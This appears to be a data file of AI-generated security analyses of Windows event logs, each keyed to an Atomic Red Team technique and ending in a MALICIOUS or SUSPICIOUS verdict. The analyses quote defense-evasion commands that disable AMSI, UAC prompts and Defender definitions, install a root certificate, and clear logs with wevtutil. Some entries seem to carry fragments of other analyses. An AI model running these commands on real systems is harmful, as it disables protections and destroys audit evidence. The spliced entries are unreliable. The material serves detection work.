4. **Time Change Event:**
   - The event with Event ID 4616 in the Security log indicates a system time change (from `16:52:23` to `16:52:32`). While time adjustments are not inherently malicious, they can be indicative of attempts to obscure timestamps following malicious actions.

5. **High Privilege Processes and User Context:**
   - Processes executed with high integrity levels (SYSTEM and `admin_test`) suggest actions were taken with elevated privileges, which is consistent with potential malicious activities requiring higher access.
   - The account `admin_test` is consistently associated with these activities, indicating misuse of this account for logging clearing and suspicious process executions.

**Assessment and Resolution:**
- The analysis shows that logs were cleared, processes were executed in atypical ways, and activities occurred likely intended to obscure actions or maintain persistence within the system.
- The combination of altering logs, inconsistent command executions, and time changes implies nefarious intentions, fitting patterns seen in sophisticated attacks.

**Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent further propagation or exfiltration.
   - Conduct a detailed forensic investigation to gather more evidence, looking into possible lateral movements or data exfiltration.
2. **User Account Audit:**
   - Review the permissions and activities associated with the `admin_test` account, reset credentials, and apply restrictions if necessary.
3. **System Restore:**
   - Consider reverting the system to a known secure state, followed by comprehensive system hardening and patching.
4. **Monitoring and Detection:**
   - Enhance monitoring tools and policies to catch similar patterns, ensuring they can promptly detect log clearing and unusual command line executions in the future.

   - Update incident response strategies, incorporating the lessons learned from this incident, to better handle similar occurrences effectively."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"Based on the provided Windows event logs, several activities suggest potentially suspicious behavior that warrants further investigation:

### Suspicious Activities Identified:
1. **Installation and Execution:**
   - The presence of logs related to the installation of a file located in a directory associated with Atomic Red Team (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_VBScript.msi`). Atomic Red Team tools are often used for security testing and adversary simulation, but their misuse can indicate malicious intent.
   - Execution of `msiexec.exe` with command lines pointing to the Atomic Red Team MSI file, suggesting potential execution of unwanted scripts or binaries.

2. **Event Log Clearing:**
   - The log entries show the clearing of multiple Windows event logs (Security, System, and Windows PowerShell) immediately prior to or after the installation-related events. This behavior is often associated with malicious activity attempting to cover tracks.

3. **Time Manipulation:**
   - Security logs suggest manipulation of system time through the Windows Time service, which can be used to evade time-based analysis.

4. **Command Line Execution:**
   - Execution of `cmd.exe` with parameters instructing the installation of a script that results in the execution of PowerShell commands without a profile (`-nop -Command Write-Host VBScript executed me!; exit`). Such usage is common in attack scenarios where the attacker wants to execute scripts or commands stealthily.

5. **Unusual PowerShell Activity:**
   - The PowerShell log shows events of a command being executed using `-nop`, which is often used to bypass security constraints. The command executed involves a message suggesting script execution via VBScript, indicating potential command injection or execution of scripts from unusual or unverified sources.

### Assessment and Recommendation:

Given the chain of events, the activities observed within the logs point to advanced stages of potentially unauthorized activity that align with known tactics used in attacks (e.g., living-off-the-land binaries, event log clearing). The involvement of potentially offensive security tools like Atomic Red Team further flags this situation for concern.

- **Resolution: SUSPICIOUS**
  - The logs contain activities that appear unusual for regular operations and indicate behaviors associated with potential threat activity.
  - Further investigation is recommended, including:
    - Validation of whether the Atomic Red Team tools were authorized for testing and ensuring they match scheduled testing activities.
    - Checking with staff to verify authorized use of such tools and evaluating potential insider threats.
    - Conducting a thorough review of the system for any indicators of compromise (IoCs) that align with the activities described in the logs.
    - Strengthening user education and logging policies to detect and prevent misuse or intended malicious behaviors.

This kind of scenario suggests a need for caution and immediate control measures to rule out ongoing threats and remediate any unauthorized actions detected on the host."
Disable ConsentPromptBehaviorAdmin via registry keys,"Based on the provided event logs, several key points of interest and potential indicators of suspicious or malicious behavior can be noted:

1. **Process Execution and Command-Line Activity:**
   - There are multiple execution instances of `wevtutil.exe` (Eventing Command Line Utility) with a command to clear logs for various channels such as Sysmon, Application, Security, and Windows PowerShell logs. While `wevtutil.exe` is a legitimate tool, its usage to clear logs can be indicative of an attempt to cover tracks, which is a common tactic used by malicious actors.
   - The command-line activity involving `cmd.exe` with the operation to modify the Windows registry settings to disable User Account Control (UAC) prompts (`ConsentPromptBehaviorAdmin`) is suspicious. This change could allow processes to run with elevated privileges without user confirmation, which is often leveraged in privilege escalation attempts.

2. **Log Clearing:**
   - Events indicating the clearing of System (`EventID 104`), Windows PowerShell, and Security logs (`EventID 1102`) are present. Log clearing is highly suspicious, particularly when performed in conjunction with suspicious process activity.

3. **Privilege Escalation and Logon Events:**
   - Multiple `4672` and `4624` security events correspond to high-privilege accounts such as `admin_test` obtaining special privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). The repeated logon and privilege events could indicate the escalation of privileges which, when coupled with other suspicious activities, might suggest unauthorized access.

4. **Time Manipulation:**
   - The Kernel events (`EventID 1`) showing system time adjustment could potentially be part of an evasion technique to muddle event timelines. However, they could also be benign, such as time synchronization operations.

5. **Final Assessment:**
   - Taken together, these log entries indicate a series of actions typically associated with malicious activity, including log manipulation, system modifications for privilege escalation, and potential credential misuse. The presence of these patterns compels an assessment of likely malicious intent.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate investigation and containment are necessary to prevent further potential damage. Consider isolating the affected system (`Server002`) from the network to prevent further activity.
- Conduct a thorough audit of all privileged accounts, particularly `admin_test`, to ensure they haven't been compromised or misused.

5. **Execution of `reg.exe`**:
   - The execution of `reg.exe` with command line arguments that modify registry policies, specifically ""ProcessCreationIncludeCmdLine_Enabled,"" under administrator privileges without a clear justification, is unusual and potentially malicious.

### Malicious Activity Indicators:

- **Log Clearing and Registry Modification**:
  - The intentional clearing of multiple crucial logs and the registry modification to disable command-line logging both suggest actions taken to evade detection and remove traces of activities. Such behavior is consistent with common post-exploitation activities undertaken by malware or an intruder.

- **Administrative Account Use for Potentially Malicious Actions**:
  - The activities were performed using an administrative account, ""admin_test,"" which increases the risk as administrative accounts have greater privileges and can cause more damage if compromised.

### Assessment and Resolution:
Given the analysis of the events, the logs indicate behavior that is clearly malicious. The actions observed in the logs, including log clearing, time manipulation, registry modification, and potential evasion techniques, strongly suggest that someone with administrative privileges intended to hide or mask malicious activities.

Overall, the situation points towards deliberate attempts to conceal activities which are typically associated with malicious behaviors, warranting comprehensive responses to ensure security integrity."
Msiexec.exe - Execute Local MSI file with embedded JScript,"Based on the analysis of the provided Windows event logs, several indicators suggest suspicious and potentially malicious activity. Here's a breakdown of the observed events:

### Identified Suspicious/Anomalous Behavior

1. **Log Clearing Events**:
   - **Event ID 1102 in Security Log** and **Event ID 104 in System and Windows PowerShell Logs**: These events indicate that the logs were cleared by the user ""admin_test"". Clearing event logs is often a tactic to hide malicious activity or cover tracks.

2. **Use of `wevtutil`**:
   - Frequent execution of `wevtutil` (Windows Event Log Utility) is noted in the Sysmon logs. This tool was used to clear logs across different channels (Security, System, Windows PowerShell). The command-line arguments clearly correspond to log clearance.

3. **Execution of `msiexec.exe`**:
   - An MSI package (`T1218.007_JScript.msi`) from the Atomic Red Team directory, a known source of red team tactics, was executed using `msiexec`. This could indicate a test or a potential simulation of exploits. If unexpected, this action should raise concerns.

4. **Presence of Red Team Artifacts**:
   - The installation path and usage of a JScript MSI installer are highly suspicious and indicative of simulated attack behaviors, particularly when tied to known security testing tools like Atomic Red Team.

5. **Unusual Command Execution**:
   - Execution of commands such as `cmd.exe`, `whoami.exe`, and `hostname.exe` immediately following event log clearance is suspicious. The sequence of these events within the timeframe aligns with the behavior seen in malicious enumeration or privilege escalation attempts.

### Assessment

- Most of the activities, including log clearance, use of `wevtutil`, and execution of known red team artifacts, align with tactics utilized in cybersecurity simulations or potential exploits.
  
- The pattern of log clearance followed by use of enumeration commands (`whoami`, `hostname`) and installation tools (msiexec with potentially malicious MSI) strongly suggests malicious intent if not previously authorized.

### Conclusion and Resolution

Given the totality of evidence, there is a clear indication of potentially malicious activity due to the log clearing efforts and the use of security testing tools without authorization. Therefore, the resolution is:

**Resolution: MALICIOUS**

Phantom Dll Hijacking - WinAppXRT.dll,"Upon reviewing the provided Windows event logs, I have identified the following key points of suspicious and potentially malicious activity:

1. **Event Log Clearing**: 
   - The logs indicate that someone with the username `admin_test` cleared logs from multiple channels: Security, System, Windows PowerShell, and Microsoft-Windows-Sysmon/Operational channels using the `wevtutil.exe` command. This activity is typically associated with attempts to cover up other actions on the system and is highly suspicious.
   - The time stamps for these log-clearing events are clustered around ""2024-10-28 15:31:32"", which suggests a rapid sequence of events likely intended to erase evidence of prior activity.

2. **Suspicious Command Execution**:
   - A `cmd.exe` process executed a complex command line that manipulated system files (`amsi.dll`) in a way that is consistent with known malware behavior. It copied, renamed, and replaced system files with potential malicious intent.
   - Additionally, the command added a registry entry (`APPX_PROCESS`) likely aimed at creating a persistent mechanism in the environment variable which could be used for malicious purposes.

3. **Process Creation and Anomalies**:
   - There are several instances of `MicrosoftEdgeUpdate.exe` being executed. While this might appear normal at first, the context of other events implies these could be leveraged or spoofed to hide malicious activity.
   - Moreover, various system utilities such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe` have been executed, likely for information gathering and log manipulation.

4. **Privilege Escalation or Abnormal Usage**:
   - The use of `wevtutil.exe` under a high integrity context by the admin_test user suggests unauthorized privilege use or an administrative account compromise.

Given the above observations, the overall activity observed in these logs indicates not just unorthodox or suspicious activity but strongly points towards a deliberate attempt at malicious compromise. 

The sequence of events—especially the clearing of logs, execution of potentially compromising commands, registry manipulation, and the nature of the processes involved—forms a pattern typically associated with evasive malware behavior and system compromise.

### Suspicious and Anomalous Activities:
1. **Log Clearing**:
   - Multiple log files such as System, Windows PowerShell, and Security logs were cleared by user `admin_test`. This is confirmed by Event ID 104 in the System log, which is associated with the clearing of log files. Clearing logs, especially security logs (Event ID 1102), is a common tactic used by attackers to cover their tracks post-exploitation. 

2. **Execution of `wevtutil`**:
   - The `wevtutil.exe` command-line tool was executed multiple times to clear various log channels, as indicated in the Sysmon logs:
     - `cl System`
     - `cl Microsoft-Windows-Sysmon/Operational`
     - `cl Application`
     - `cl Security`
     - `cl ""Windows PowerShell""`
   - Such activities indicate deliberate attempts to delete event logs, which is often related to malicious intent.

3. **Modification to the Registry**:
   - A suspicious registry modification was attempted using `cmd.exe` and `reg.exe` to add a new entry: `HKLM\Software\Microsoft\.NETFramework ETWEnabled` with a value set to 0. This can potentially alter system behavior or disable certain functionalities related to .NET logging.

4. **Unusual Command Execution**:
   - Various benign system utilities such as `hostname.exe` and `whoami.exe` were executed, which are typically used for reconnaissance. However, their individual presence without context might be benign.

### Assessment of Threat:
- **Indicators of Malicious Activity**:
  The combination of log clearing, registry modification, and command executions align with tactics, techniques, and procedures (TTPs) commonly used in post-exploitation scenarios. The activity indicates potential compromise by an adversary attempting to escalate privileges, maintain persistence, or cover their tracks.

### Recommendation:
- An immediate security review of the `admin_test` account is required. This includes verifying recent password changes, examining recent login activity, and reviewing permissions.
- Conduct a thorough investigation into network activity to identify any external connections or data exfiltration attempts.

Windows HideSCAHealth Group Policy Feature,"### Log Analysis

Upon reviewing the provided logs from various Windows event channels, several key observations and potential indicators of compromise have been identified:

#### 1. **Log Cleared Events**
- **System Log Removal**: There are events indicating that logs have been cleared for both the System channel and the Windows PowerShell channel, specifically by the user `admin_test`. 
- **Security Log Removal**: Additionally, there is a critical event (EventID 1102) showing that the Security log was cleared by the same user.

Clearing logs is a common tactic used by attackers to cover their tracks and is inherently suspicious, especially if not part of regular administrative maintenance.

#### 2. **Suspicious Use of `wevtutil`**
- There are multiple instances where `wevtutil.exe` was used to clear different event logs such as System, Application, Security, and Windows PowerShell logs. The consistent use of `wevtutil` with high integrity level by the `admin_test` user raises significant concerns.

#### 3. **Unusual Command Execution**
- A `cmd.exe` process executed a command to alter Windows Explorer policies in the registry:
  ```
  reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f
  ```
  Modifying registry entries, particularly those affecting user policies, can indicate attempts to alter system behavior, possibly for nefarious purposes.

#### 4. **Unusual Use of `whoami.exe` and `hostname.exe`**
- Invocation of `whoami.exe` and `hostname.exe` within the context of potential privilege escalation or reconnaissance. While not inherently malicious, their use amidst other suspicious activity may correlate with malicious intent.

UEFI Persistence via Wpbbin.exe File Creation,"## Detailed Analysis of Windows Event Logs

### Summary of Findings:
The provided logs indicate several suspicious activities on the monitored host (Server002). Key indicators of potential malicious activity and system compromise have been identified, warranting further investigation. Below is the analysis detailing these observations:

1. **PowerShell Usage:**
   - The logs show that PowerShell was executed with the `New-Item` cmdlet to create a potentially executable file named `wpbbin.exe` in the Windows System32 directory (`C:\\Windows\\System32\\wpbbin.exe`). The exact command used was:
     ```
     ""powershell.exe"" & {echo \""Creating %systemroot%\\wpbbin.exe\"", New-Item -ItemType File -Path \""$env:SystemRoot\\System32\\wpbbin.exe\""}
     ```
   - Creation of files in the System32 directory by PowerShell is highly unusual, especially for regular users, indicating potential tampering or a breach. The use of PowerShell in this manner is a common tactic for attackers looking to execute malicious code under the guise of legitimate processes.

2. **Clearing of Event Logs:**
   - Events show that logs for several channels, such as System and Security, have been cleared:
     - EventID 104 for System and Windows PowerShell logs, and EventID 1102 for the Security log indicate log clearing activities.
     - These actions were performed by the user `admin_test`. Log clearing is often a method attackers use to cover their tracks and hide malicious activities.

3. **Utilization of `wevtutil`:**
   - There are instances of the command-line utility `wevtutil.exe` being used to clear event logs:
     ```
     ""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational
     ""C:\\Windows\\system32\\wevtutil.exe\"" cl Application
     ""C:\\Windows\\system32\\wevtutil.exe\"" cl Security
     ```
   - Use of `wevtutil` to clear logs is unusual in routine operations and suggests potential malicious intentions, matching the practice of evading detection.

4. **Time Manipulation:**
   - There are instances of time manipulation attempts indicated by:
     - EventID 4616 suggesting that the system time was altered, a potential indicator of adversaries attempting to alter evidence or disrupt logging.

5. **Use of Network Messaging (NTLM):**
   - An NTLM authentication process was recorded. While NTLMv2 itself is not inherently suspicious, if it occurs unexpectedly or with suspicious source/destination IPs, it could suggest credential theft or misuse.

### Assessment of Situation:
Based on the patterns of unauthorized PowerShell activity, event log clearance, and time manipulation, there is strong evidence suggesting compromise and potentially malicious activity on the system.

DLL Search Order Hijacking - amsi.dll,"Upon reviewing the provided logs, several key observations indicate potential malicious activity:

### Key Findings:

1. **PowerShell Execution**:
   - A suspicious PowerShell execution is noted where a file named `updater.exe` is running from the `AppData\Roaming` directory with the command `-Command exit`. This behavior is abnormal because legitimate applications, especially updates, typically do not run from this location, nor do they invoke PowerShell in such a manner.

2. **Log File Clearing**:
   - In the Security and System logs, there are events (`EventID: 1102` for Security, and `EventID: 104` for System) that indicate log files have been cleared by the user `admin_test`. Clearing logs is a common technique to cover malicious activities and is highly suspicious, especially when combined with other anomalous activities.

3. **Process Execution Patterns**:
   - The Sysmon logs capture the execution of several processes like `whoami.exe`, `wevtutil.exe`, and `cmd.exe`. Notably, `wevtutil.exe` is used to clear event logs (`cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`), which aligns with covering tracks.

4. **Unauthorized File Copy**:
   - A suspicious `cmd.exe` execution (Sysmon `EventID: 1`) with commands to copy `powershell.exe` to `updater.exe` and `amsi.dll` to the same directory in `AppData`. This is indicative of a potential attempt to evade detection, possibly by manipulating `amsi.dll`, which is involved with antivirus scan interfaces.

5. **Excessive Use of System Tools**:
   - Consistent with lateral movement, or data exfiltration preparations, are the repeated executions of native Windows utilities (`whoami.exe`, `hostname.exe`) which provide environment reconnaissance.

### Assessment:
Given the context and behaviors observed, the activity strongly suggests a compromise, specifically indicative of a potential malware infection using living-off-the-land techniques to evade detection and carry out malicious activities quietly. Regular user processes being run from unusual locations with PowerShell usage and log clearing are significant red flags.

### Resolution: MALICIOUS

### Guidance:
1. **Immediate Response**:
   - Isolate the affected machine (`Server002`) from the network to prevent further spread or data exfiltration.
   - Conduct a thorough scan with updated antivirus solutions and specialized malware detection tools.
   - Analyze the binaries (`updater.exe`, potentially altered `amsi.dll`) in a secure sandbox environment to understand their behavior.

2. **Forensics**:
   - Conduct a full digital forensic analysis to understand the extent of the compromise, including malware entry points and persistence mechanisms.
   - Examine other connected systems for similar signs of compromise.

3. **Remediation and Strengthening**:
   - Reboot the system in Safe Mode and clean any malicious processes or entries in boot commands.
   - Ensure all systems have the latest security patches and hardened configurations.
   - Implement stricter monitoring for unusual behavior patterns and improve logging to prevent clearing.
   - Educate employees on recognizing potential phishing attacks which might have led to such compromise.

This assessment is based on the available logs, and further investigation is advised to confirm the scope of the intrusion and ensure comprehensive remediation."
AMSI Bypass - Create AMSIEnable Reg Key,"**Detailed Analysis of Logs:**

Upon reviewing the provided Windows event logs from various categories such as PowerShell, Sysmon, Application, Security, and System, several activities stand out which indicate potential malicious activity:

1. **PowerShell Events:**
   - The PowerShell logs show a command executed to modify the Windows registry to disable AMSI (Antimalware Scan Interface) by setting the `AmsiEnable` property to 0. The command executed is:
     ```
     powershell.exe & {New-Item -Path ""HKCU:\\Software\\Microsoft\\Windows Script\\Settings"" -Force | Out-Null
     New-ItemProperty -Path ""HKCU:\\Software\\Microsoft\\Windows Script\\Settings"" -Name ""AmsiEnable"" -Value 0 -PropertyType DWORD -Force | Out-Null}
     ```
   - Disabling AMSI is a common technique used by malware to evade detection as AMSI provides a standardized interface for anti-malware products to integrate with Windows.

2. **Sysmon Logs:**
   - We observe multiple instances of `wevtutil.exe` being used to clear various event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). Clearing event logs is typically a behavior associated with malware attempting to cover its tracks.
   - All these actions are performed under the user `SERVER002\\admin_test`, indicating potential misuse of admin privileges.

3. **Security and System Logs:**
   - Event log ID `1102` in the Security log indicates that the security log was cleared by the user `admin_test`. This user is involved in the execution of the log-clearing commands as well.
   - The System log also shows Event ID `104` for the clearing of logs, again under the user `admin_test`, suggesting preparation to remain stealthy.
   
4. **Additional Observations:**
   - Legitimate processes such as `Microsoft Edge Update` and other system activities are also logged, but they appear normal within the context of system updates and maintenance tasks.
   - Time manipulation is seen (Event ID `4616`), possibly related to system updates or synchronization activities, but warrants attention in conjunction with other findings.

**Assessment:**

The combination of registry modification to disable AMSI, clearing of Windows event logs, and the involvement of an admin-level account in executing these actions strongly suggest malicious intent and activity aimed at evading detection and covering the attacker's tracks. The use of `PowerShell` for registry changes and `wevtutil.exe` for log clearance are common tactics used in advanced persistent threat (APT) scenarios.

**Resolution: MALICIOUS**

**Guidance and Next Steps:**

1. Immediate isolation of the affected machine (Server002) from the network to prevent further compromise or data exfiltration.
2. Conduct a full incident response and forensic analysis on the system to identify the infection vector and gather evidence.
3. Reset credentials for all accounts that may have been compromised, particularly focusing on `admin_test`.
4. Review and enhance endpoint protection policies, ensuring AMSI and other security features are properly configured and enforced.
5. Conduct a network-wide scan for other potentially affected systems or indicators of similar compromise.
6. Educate users on phishing and social engineering, as these methods are common entry points for such attacks."
UACME Bypass Method 33,"Based on the analysis of the provided logs, there are several indicators that point towards suspicious and potentially malicious activity on the system named ""Server002"". Below is a detailed breakdown of the observed events:

1. **Log Clearing Activities**:
   - There are multiple instances where the logs for different channels (System, Security, and Windows PowerShell) have been cleared, as indicated by `Event ID 104` in the system log and `Event ID 1102` in the security log. This activity is attributed to the user `admin_test`. Log clearing is a common tactic used by attackers to cover their tracks and is a strong indicator of malicious intent.

2. **Suspicious Command Execution**:
   - The Sysmon logs reveal the execution of `cmd.exe` with suspicious command lines, such as a script attempting to execute `Akagi64.exe` from the `AtomicRedTeam` directory. `Akagi64.exe` is associated with known privilege escalation techniques.
   - The presence of references to the `uacme` tool in the command line executed by `cmd.exe`, which is well-known for bypassing User Account Control (UAC).

3. **High-Privilege Processes**:
   - There are several processes running under high privilege (`IntegrityLevel: High`), including `wevtutil.exe` being used to clear logs, which further corroborates the attempt to erase traces of activity.

4. **Process Injection and Execution Patterns**:
   - The correlation between `powershell.exe` and `cmd.exe` indicates a sequence of commands likely used to execute scripts or commands with elevated privileges stealthily.
   - Execution of `wevtutil.exe` multiple times by the `admin_test` account immediately after log clearance is another red flag for obfuscatory behavior.

5. **EdgeUpdate Executions**:
   - Numerous entries in the Sysmon logs for `MicrosoftEdgeUpdate.exe` are observed with various command-line arguments. This alone might be patch update activity, but given the context with other logs being cleared and use of privilege escalation tools, it requires further investigation to rule out exploitation via software updates.

6. **Scheduled Telemetry Runs**:
   - The `CompatTelRunner.exe` observed running as part of telemetry tasks, scheduled via command line, indicates potential abuse of Windows telemetry for persistence or lateral movement.

Given these observations, the logs point towards orchestrated attempts to compromise and maintain control over the host, leveraging privilege escalation techniques, log clearing to hide unlawful activity, and potentially exploiting software update mechanisms. 

### Final Assessment: MALICIOUS

**Guidance for Proceeding**:
1. **Isolate the Affected System**: Immediately isolate `Server002` from the network to prevent further spread or data exfiltration.
2. **Conduct a Full Forensic Analysis**: Perform a detailed investigation to understand the full extent of the compromise and identify any additional affected systems.
3. **Audit for Unauthorized Access**: Review all user accounts, particularly focusing on any unauthorized access associated with the `admin_test` account or any domain accounts.
4. **Change Credentials**: Enforce a change of credentials for all accounts that might have been affected and elevate the monitoring level for these accounts.
5. **Review EDR and SIEM**: Cross-check EDR (Endpoint Detection and Response) and SIEM (Security Information and Event Management) alerts for any correlating activity patterns.
6. **Update Security Measures**: Ensure all systems, especially those related to patch management and system update processes, are secured against any known vulnerabilities.

Based on the logs, the activity is definitively categorized as malicious, necessitating a coordinated incident response."
Disable Windows Security Center Notifications,"Upon reviewing the provided Sysmon, Application, Security, and System logs, several observations can be summarized:

1. **Sysmon Logs:**
   - A pattern of frequent usage of `wevtutil.exe` to clear logs across various Windows log channels (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, ""Windows PowerShell"") can be observed. These actions are typically initiated by the process `wsmprovhost.exe`, which is unusual since it is not a standard use case for `wevtutil.exe` and `wsmprovhost.exe`.
   - The events correlate to a single user account, `SERVER002\\admin_test`, performing these operations with `High` integrity level, which indicates administrative privileges.

2. **Security Logs:**
   - Event ID 1102 indicates that the Security log was cleared by the `admin_test` account. The clearing of security logs is a common tactic used by malicious actors to cover their tracks.
   - A series of privilege escalation events (Event ID 4672) indicate the `admin_test` account was granted a range of elevated privileges.

3. **Application and System Logs:**
   - System and powershell logs were also cleared as evidenced by Event ID 104 in the System log channel. Like clearing security logs, clearing system logs is often indicative of malicious activity.

4. **Command Executions:**
   - The presence of registry modification commands executed by `cmd.exe` using `reg.exe` to alter system settings (`HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell`) shows attempts to modify the system's behavior possibly for persistence or evasion technique. This is further amplified by the use of `cmd.exe` with registry-related command line arguments.

**Assessment:**
The activity observed in the logs, such as frequent log clearing, privilege escalation, and registry modifications done from a user with high-level privileges, points to evidence of malicious intentions. These behaviors align with typical adversary tactics to preserve stealth and persistence on the compromised system.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Conduct a comprehensive investigation of the `admin_test` user account for unauthorized activity or compromise.
- Analyze any artifacts and data changes resulting from the registry modifications.
- Isolate the affected system `Server002` to prevent further potential damage.
- Audit and enhance monitoring on similar administrative activities across the network environment.
- Consider engaging forensic services to perform a detailed assessment and recovery operations, including reviews for other potentially affected accounts or systems."
Remove Windows Defender Definition Files,"### Detailed Analysis of the Logs

#### 1. **Application Log Analysis**
- The application log entries repeatedly indicate that Windows Defender is in the ""SECURITY_PRODUCT_STATE_ON"" state. This is typically a benign state and suggests that the security software is active and functioning.

#### 2. **Sysmon Log Analysis**
- Multiple events indicate the execution of the `wevtutil.exe` utility, which is used to clear event logs. The command-line arguments `""cl Application""`, `""cl System""`, `""cl Security""`, and `""cl Microsoft-Windows-Sysmon/Operational""` strongly suggest that there is an attempt to clear or query logs for potentially malicious purposes.
- The `cmd.exe` is used with `MpCmdRun.exe` to execute `-RemoveDefinitions -All`, which means removing all malware protection definitions from Windows Defender. This activity is highly suspicious and commonly associated with an adversary trying to disable security features.
- `whoami.exe` and `hostname.exe` are used, indicating an attempt to gather information on the environment and the current user context. This is often seen in post-compromise environments where attackers attempt to escalate their privileges or establish persistence.

#### 3. **System Log Analysis**
- There are events indicating that the event logs for the ""System"" and ""Windows PowerShell"" channels have been cleared. The user `admin_test` carrying out this action and correlates with the suspicious execution observed in the Sysmon logs.

#### 4. **Security Log Analysis**
- The security log event `1102` indicates that the security log has been cleared. This action is undertaken by the same user `admin_test`, matching with the process ID `3128` which corresponds to the `wevtutil.exe` execution from the Sysmon log.

### Assessment of the Situation

Based on the analysis of these logs, the following suspicious and potentially malicious activities have been identified:
- **Command-Line Utility Usage**: There are numerous executions of `wevtutil.exe` to clear logs, which is classic attacker behavior to cover tracks.
- **Security Mechanism Disabling**: Execution of `cmd.exe` in conjunction with `MpCmdRun.exe -RemoveDefinitions -All` is a clear attempt to disable Windows Defender, a protective security mechanism.
- **Log Clearing**: The clearing of different logs such as Application, System, Security, and Windows PowerShell by the `admin_test` user indicates an effort to hide activities on the system.

### Threats and Risks Identified
- **Potential Compromise**: The presence of commands to disable Windows Defender and clear logs suggests a compromised host potentially controlled by a malicious actor.
- **Security Evasion**: The clearing of logs and disabling of antivirus could allow the adversary to operate undetected and install backdoors or remove traces of other malicious activities.

### Guidance on How to Proceed
1. **Immediate Isolation**: Isolate the machine from the network to prevent further malicious activities.
2. **Detailed Forensic Analysis**: Conduct a comprehensive forensic analysis to identify any backdoors or persistence mechanisms installed.
3. **Review Access Logs**: Identify how the user `admin_test` gained elevated privileges to perform these actions.
4. **Update Security Protocols**: Enhance monitoring to detect similar activities and review endpoint security configurations to prevent disabling of security features.

### Resolution
The findings indicate clear signs of malicious activities on the host. Therefore, the resolution is:
- **MALICIOUS**: The logs contain confirmed malicious activities designed to disable security features and cover tracks."
Install root CA on Windows with certutil,"Upon review of the provided Windows event logs, multiple indicators of potentially malicious activity have been observed. Here is a detailed analysis:

### Suspicious or Anomalous Behavior:
1. **Log Clearing Events**: 
   - System log Event ID 104 and Security log Event ID 1102 indicate that logs from multiple channels (System, Windows PowerShell, and Security) were cleared by a user with the username ""admin_test."" This is suspicious as this action is commonly taken by an attacker attempting to cover their tracks after a system compromise.

2. **Command Line Execution with PowerShell**:
   - Sysmon logs show several instances of `wevtutil.exe cl` command being executed by the same user ""admin_test"" to clear event logs for multiple channels.
   - The PowerShell command executed: `powershell.exe & {certutil -addstore my $env:Temp\\rootCA2.cer}` is used to add a certificate to the system without explicit authorization or logging, which is often associated with malicious activities, such as proxying or MITM attacks.

3. **Spike in Process Creation**:
   - There are multiple process creation events involving `wevtutil.exe` and high integrity sessions indicating a potential misuse of administrative privileges.
   - Certutil is a legitimate utility often used for malicious purposes like transferring files or installing unauthorized certificates, as indicated by its use here.

4. **Microsoft EdgeUpdate Activity**: 
   - A large number of Sysmon events are related to `MicrosoftEdgeUpdate.exe` running or being installed. While these can be legitimate, the frequency and the overlap with other suspicious activities raise concerns of potentially unwanted software updates or inclusion of malicious payloads.

### Evidence of Malicious Activities or Compromise:
- The combination of log clearing, coupled with PowerShell and certutil command usage, aligns closely with techniques often observed in post-exploitation phases of a cyberattack.

### Resolution and Recommendations:
Given the combination of the above indicators strongly pointing to intentional malicious activity being executed, the log entries have been assessed as **MALICIOUS**. As such, the following steps are recommended:
1. **Immediate Isolation**: Isolate the concerned system (Server002) from the network to prevent any further malicious activity.
2. **Incident Response**: Initiate a detailed forensic investigation to determine the extent of the breach, identify any additional compromised assets, and analyze other entry points or persistence mechanisms.
3. **Patch and Clean**: Ensure that all software, especially Microsoft EdgeUpdate, is patched and up-to-date. Clean suspicious installations if any malware is confirmed.
4. **Audit and Monitoring**: Set up or enhance logging and monitoring for unusual activity like log clearing and command executions involving PowerShell and wevtutil.
5. **User and Access Management**: Review administrator privileges, reset passwords, and consider implementing additional access controls, especially for sensitive accounts like ""admin_test"" and servers such as Server002.

**Note**: Given that the logs indicate only one isolated high-integrity user (“admin_test”) was involved, it's crucial to reevaluate user behavioral patterns and network traffic for further signs of malicious use."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"After a thorough analysis of the provided Windows event logs, several indicators suggest potential malicious activity:

1. **Clearing of Event Logs:**
   - The logs show multiple entries of event log clearing. For example, Event ID 104 and Event ID 1102 in both the System and Security logs indicate a ""LogFileCleared"" event performed by the user ""admin_test"". Clearing event logs is a common tactic used by attackers to cover their tracks and is suspicious especially when performed close together and across several log types.

2. **Suspicious PowerShell Activity:**
   - The PowerShell logs reveal the execution of a script (appearing in multiple entries) that involves modifying registry keys related to UAC (User Account Control). Specifically, changing the `ConsentPromptBehaviorAdmin` registry value to `0` effectively disables the UAC prompt for administrators, which is a common method used for privilege escalation without user consent.
   - The command involved is: `Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force`.

3. **Execution of System Utilities:**
   - There are multiple launches of system utilities such as `whoami.exe`, `hostname.exe`, and `wevtutil.exe` by the user ""admin_test"". This pattern is consistent with post-exploitation enumeration activities to understand the user context and environment details.
   - Additionally, multiple instances of `wevtutil.exe` are used, which is capable of clearing event logs, thus aligning with the clearing of logs discussed above.

4. **High Integrity Level of Process Execution:**
   - Many processes, particularly the suspicious PowerShell executions, are running at a ""High"" integrity level, suggesting potentially escalated privileges used to execute these commands.

5. **Sysmon Logs:**
   - The correlation of processes and their use in clearing event logs coupled with PowerShell modifications strongly reflects a chain of malicious behavior aligning with a possibly compromised account or unauthorized access.

Overall, the evidence in these logs strongly aligns with a typical attack pattern involving log tampering and privilege escalation. 

### Final Assessment:
- **Resolution: MALICIOUS**

**Guidance:**
1. **Immediate Isolation**: The affected machine (Server002) should be isolated from the network to prevent further malicious actions or data exfiltration.
